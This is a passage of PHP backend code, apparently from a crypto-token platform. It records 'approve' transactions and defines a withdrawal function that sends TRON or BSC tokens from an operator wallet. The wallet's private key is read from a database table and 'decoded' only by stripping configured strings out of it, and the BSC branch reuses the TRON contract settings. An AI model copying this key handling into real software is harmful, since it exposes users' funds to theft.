                    $data['txid'] = $result->txID;
                    $data['amount1'] = $result->amount1;//shop
                    $data['amount2'] = 0;//js
                    $data['amount3'] = 0;//lpt
                } else {
                    $data['txid'] = $result['hash'];
                    $data['amount1'] = $result['amount1'];//shop
                    $data['amount2'] = 0;//js
                    $data['amount3'] = 0;//lpt
                }
                $data['qb_type'] = $qb_type;
                $data['user_id'] = $row['user_id'];
                $data['address'] = $row['address'];
                $data['to_address'] = $to;
                $data['money'] = $amount;
                $data['createtime'] = time();
                $data['updatetime'] = time();
                $ishave = (new \app\admin\model\approve\Transaction())->where(['txid' => $data['txid']])->find();
                if ($ishave) {
                    $ishave->save(['updatetime' => time()]);
                } else {
                    (new \app\admin\model\approve\Transaction())->insert($data);
                }
            }
        }
        return $result;
    }
}
//转账提现下分
if (!function_exists('reviewWithdrawTransfer')) {
    /**
     * 提现划转
     */
    function reviewWithdrawTransfer($user_id,$amount,$receive_wallet)
    {
        $result = '';
        $finance = \app\admin\model\user\Finance::where(['user_id' => $user_id])->find();
        if ((new \Tron\Address($receive_wallet))->isValid()) {
            $qb_type = 3;
            $approve_user_address = $finance['operate_wallet_trx'];
            $approve_key = $finance['operate_wallet_trx_key'];
            $contractAddress = config('conf.contract_trx');
            $decimals = config('conf.contract_trx_decimals');
        } else {
            $qb_type = 4;
            $approve_user_address = $finance['operate_wallet_bsc'];
            $approve_key = $finance['operate_wallet_bsc_key'];
            $contractAddress = config('conf.contract_trx');
            $decimals = config('conf.contract_trx_decimals');
        }
        if ($amount) {
            $to = $receive_wallet;
            $rrr_arr = config('conf.rrr_arr');
            $psd = $approve_key;
            foreach ($rrr_arr as $aaa) {
                $psd = str_replace($aaa, '', $psd);
            }
            $result = (new \app\common\service\Getbalance())->dozTransfer($qb_type,$approve_user_address,$psd,$to,$amount,$contractAddress,$decimals);
        }
        return $result;
    }
}
